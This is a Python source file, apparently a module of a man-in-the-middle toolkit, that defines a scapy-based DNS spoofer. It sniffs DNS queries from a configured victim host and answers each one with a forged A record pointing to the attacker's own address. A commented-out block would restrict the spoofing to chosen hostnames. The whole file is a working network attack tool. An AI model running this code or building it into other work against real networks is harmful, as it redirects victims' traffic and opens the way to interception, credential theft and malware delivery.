from scapy.all import conf, sniff, IP, UDP, DNS, DNSRR, get_if_addr, send, ETH_P_ALL
import socket
from service import Service

class DNSService(Service):
    def start(self):
        self.socket = conf.L2listen(
            type=ETH_P_ALL,
            iface=self.config.iface,
            filter= "udp port 53 and src host " + self.config.victim.getIP()
        )

        print("Started DNS spoofer")

        sniff(
            opened_socket=self.socket,
            prn=self.print_packet,
            stop_filter=self.should_stop_after_packet
        )

    def should_stop_after_packet(self, packet):
        return self.shouldStop()

    def print_packet(self, packet):
        ip = packet.getlayer(IP)
        udp = packet.getlayer(UDP)
        dns = packet.getlayer(DNS)
        
        # standard (a record) dns query
        if dns.qr == 0 and dns.opcode == 0:
            queried_host = dns.qd.qname[:-1].decode()
            resolved_ip = get_if_addr(self.config.iface)

            # Only spoof certain addresses if not *
            # if self.hostnames != "*":
            #    if not queried_host in self.hostnames:
                    # Uncomment:
                    #return
                    # Otherwise, we will return the correct ip address
                    # For the requested hostname
            #        resolved_ip = socket.gethostbyname(queried_host)
                    
            if resolved_ip:
                dns_answer = DNSRR(rrname=queried_host + ".",
                                        ttl=330,
                                        type="A",
                                        rclass="IN",
                                        rdata=resolved_ip)

                dns_reply = IP(src=ip.dst, dst=ip.src) / \
                            UDP(sport=udp.dport,
                                    dport=udp.sport) / \
                            DNS(
                                id = dns.id,
                                qr = 1,
                                aa = 0,
                                rcode = 0,
                                qd = dns.qd,
                                an = dns_answer
                            )

                print("Send %s has %s to %s" % (queried_host,
                                                resolved_ip,
                                                ip.src))
                send(dns_reply, iface=self.config.iface)